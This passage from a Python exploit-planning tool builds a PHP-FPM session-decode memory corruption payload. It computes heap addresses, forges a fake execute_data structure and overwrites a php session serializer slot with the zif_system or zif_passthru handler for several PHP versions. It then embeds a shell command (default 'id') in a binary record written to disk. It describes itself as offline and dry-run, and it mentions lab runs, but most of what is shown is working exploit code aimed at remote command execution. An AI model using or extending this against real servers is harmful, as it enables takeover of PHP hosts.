        "serializer": PHP_BINARY_SERIALIZER,
        "clean": decode == "zif_passthru",
        "one_shot": decode == "zif_system",
        "target_behavior": target_behavior,
        "status": profile["status"],
        "binary": profile["binary"],
        "build_id": profile["build_id"],
        "md5": profile.get("md5"),
        "php_version": profile["php_version"],
        "elf_type": profile["elf_type"],
        "pie": profile["pie"],
        "zend_eval_string": profile.get("zend_eval_string"),
        "zend_eval_stringl": profile.get("zend_eval_stringl"),
        "dry_run": True,
        "sent": False,
        "no_transport": True,
        "addresses": {
            "x": f"0x{x:x}",
            "x1": f"0x{x:x}",
            "x2": f"0x{x2:x}",
            "zstr_val": f"0x{x + 24:x}",
            "zstr_val1": f"0x{x + 24:x}",
            "zstr_val2": f"0x{x2 + 24:x}",
            "p": f"0x{p:x}",
            "b0": f"0x{b0:x}",
            "target": f"0x{target:x}",
            "zif": f"0x{zif:x}",
            "zif_system": (
                f"0x{hex_int(profile['zif_system'], 'zif_system'):x}"
                if profile.get("zif_system") is not None else None),
            "zif_passthru": (
                f"0x{hex_int(profile['zif_passthru'], 'zif_passthru'):x}"
                if profile.get("zif_passthru") is not None else None),
            "zif_delta_from_system": (
                f"0x{zif_delta:x}" if zif_delta is not None else None),
            "php_exec_ex": (
                f"0x{hex_int(profile['php_exec_ex'], 'php_exec_ex'):x}"
                if profile.get("php_exec_ex") is not None else None),
            "php_exec": (
                f"0x{hex_int(profile['php_exec'], 'php_exec'):x}"
                if profile.get("php_exec") is not None else None),
            "system": None,
            "libc_base": None,
        },
        "target_entry": (
            {"index": entry["index"], "name": entry["name"]}
            if entry is not None else None
        ),
        "serializer_entry": {
            "index": serializer["index"],
            "name": serializer["name"],
            "decode": serializer["decode"],
        },
        "ps_serializers": {
            "table": table["table"],
            "active_serializer_slot": table["active_serializer_slot"],
            "terminator": table["terminator"],
            "default_handler": table.get("default_handler"),
            "default_php_decode": table.get("default_php_decode"),
            "default_php_decode_16b_aligned": table.get(
                "default_php_decode_16b_aligned"),
            "note": table.get("note"),
        },
        "ps_serializer_slot": profile.get("ps_serializer_slot"),
        "decode_call": profile["decode_call"],
        "used_slots": used_slots,
        "slot": f"0x{target:x}",
        "second_slot": f"0x{second_slot:x}",
        "type_zero_offsets": [
            f"0x{target + 8:x}", f"0x{target + 24:x}"],
        "fake_execute_data": {
            "base": "ZSTR_VAL(data) = X2 + 0x18",
            "num_args_off": "0x2c",
            "num_args": 1,
            "arg1_value_off": "0x50",
            "arg1_value": f"0x{f_addr:x}",
            "arg1_value_source": (
                f"X2 + 0x18 + Q(0x{Q:x}) + 0x{ZIF_F_PAYLOAD_OFF:x}"),
            "arg1_type_off": "0x58",
            "arg1_type": ZIF_ARG1_IS_STRING,
            "arg1_type_name": "IS_STRING",
            "zend_string_len_off": "0x10",
            "zend_string_len": len(command_bytes),
            "zend_string_val_off": "0x18",
            "command": command_bytes.decode("latin1"),
            "func_read": False,
            "arg_info_read": False,
        },
        "geometry": {
            "total": total,
            "rec1_len": rec1_len,
            "key1_len": ZIF_KEY1_BYTES,
            "command_bytes": len(command_bytes),
            "value": value_bytes.decode("ascii"),
            "length": length,
            "payload_start": Q,
            "p_off": p_off,
            "p_idx": p_idx,
            "b_off": b_off,
            "b_idx": b_idx,
            "f_payload_off": ZIF_F_PAYLOAD_OFF,
            "f_off": f_off,
            "f_addr": f_addr,
            "cmd_len_off": Q + ZIF_CMD_LEN_OFF,
            "cmd_off": Q + ZIF_CMD_OFF,
            "command_hex": command_bytes.hex(),
            "second_decode": (
                "the re-encoded T2 buffer is the second php_session_decode "
                "argument; the lab T1/T2 were 131014/131313 bytes"
            ),
        },
        "checks": checks,
        "prerequisites": list(profile.get("prerequisites") or []) + [
            "G6: supply X1 and X2 for the first and second decode buffers, "
            "plus P and B0; zif_passthru is the clean survivor, zif_system "
            "is one-shot",
            "G6: the fake execute_data fields live in the 96 byte key1 and "
            "the record-2 payload; the command is NUL-free and F+0x10 is its "
            "strlen",
        ],
        "caveats": caveats,
        "receipts": receipts,
        "record": record,
    }


def main() -> int:
    parser = argparse.ArgumentParser(
        description="G2/G6 FPM record plan (offline, no transport)")
    parser.add_argument("--g2-x", required=True, help="first decode zend_string X")
    parser.add_argument("--g2-x2", default=None,
                        help="second decode zend_string X2 (required for zif_*)")
    parser.add_argument("--g2-p", required=True, help="stale php_unserialize_data P")
    parser.add_argument("--g2-b0", required=True, help="stale var_dtor_entries B0")
    parser.add_argument("--g2-profile", default=None,
                        help="profile version (8.5.10, 8.4.25, 8.1.34, "
                             "7.4.33, realapps-8.5.10), md5 or .json path "
                             "(default 8.5.10); realapps-8.5.10 carries the "
                             "F12b php-session record; plans its php_binary "
                             "entry, not the php slot")
    parser.add_argument("--g2-decode", choices=DECODE_MODES, default="php_binary",
                        help="php_binary (G2), zif_passthru (G6 clean) or "
                             "zif_system (G6 one-shot)")
    parser.add_argument("--g2-total", type=int, default=None)
    parser.add_argument("--g2-target", default=None)
    parser.add_argument("--g2-value", default=None)
    parser.add_argument("--libc-base", default=None)
    parser.add_argument("--command", default=None)
    parser.add_argument("--output", type=Path, default=None)
    args = parser.parse_args()
    if args.g2_decode in ZIF_DECODE_MODES:
        if args.g2_x2 is None:
            print(json.dumps({
                "step": "g2", "decode": args.g2_decode,
                "error": f"ValueError: --g2-decode {args.g2_decode} requires "
                         "--g2-x2 (the second decode buffer)",
            }))
            return 2
        if args.g2_value is not None or args.libc_base is not None:
            print(json.dumps({
                "step": "g2", "decode": args.g2_decode,
                "error": "ValueError: --g2-value/--libc-base do not apply to "
                         "a zif decode target; the written value is the profile "
                         "zif handler address",
            }))
            return 2
    elif args.g2_x2 is not None:
        print(json.dumps({
            "step": "g2", "decode": args.g2_decode,
            "error": "ValueError: --g2-x2 applies only to a zif decode target",
        }))
        return 2
    command = args.command
    if command is None:
        command = "id" if args.g2_decode in ZIF_DECODE_MODES else "id;exit;#"
    try:
        profile, profile_path = load_profile(args.g2_profile)
        summary = plan(
            x=hex_int(args.g2_x, "--g2-x"),
            x2=(hex_int(args.g2_x2, "--g2-x2")
                if args.g2_x2 is not None else None),
            p=hex_int(args.g2_p, "--g2-p"),
            b0=hex_int(args.g2_b0, "--g2-b0"),
            total=args.g2_total,
            command=command,
            value=args.g2_value,
            libc_base=(hex_int(args.libc_base, "--libc-base")
                       if args.libc_base is not None else None),
            target=(hex_int(args.g2_target, "--g2-target")
                    if args.g2_target is not None else None),
            profile=profile,
            profile_path=profile_path,
            decode=args.g2_decode,
        )
    except (OSError, TypeError, ValueError) as error:
        print(json.dumps({"step": "g2", "error": f"{type(error).__name__}: {error}"}))
        return 2
    record = summary.pop("record")
    if args.output is not None:
        args.output.mkdir(parents=True, exist_ok=True)
        (args.output / "g2-record.bin").write_bytes(record)
        (args.output / "result.json").write_text(
            json.dumps(summary, indent=2, sort_keys=True) + "\n")
    print(json.dumps(summary, indent=2, sort_keys=True))
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
